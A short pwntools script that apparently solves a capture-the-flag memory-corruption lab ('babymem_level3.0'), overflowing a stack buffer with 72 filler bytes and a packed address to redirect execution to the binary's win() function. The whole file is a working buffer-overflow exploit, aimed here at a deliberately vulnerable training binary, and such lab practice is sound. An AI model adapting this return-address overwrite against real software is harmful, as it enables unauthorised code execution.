from pwn import * 

context.log_level = 'debug'
context.arch = 'amd64'
context.bits = 64 
context.terminal = ['tmux', 'splitw', '-v']

proc = process(["/challenge/babymem_level3.0"])
proc.recvuntil(b'Payload size: ')

proc.sendline(b'80')
proc.recv()

payload = b'A' * 72 + p64(0x0000000000401eaa)
proc.sendline(payload)

proc.interactive()

# return address of the win() function => 0000000000401eaa
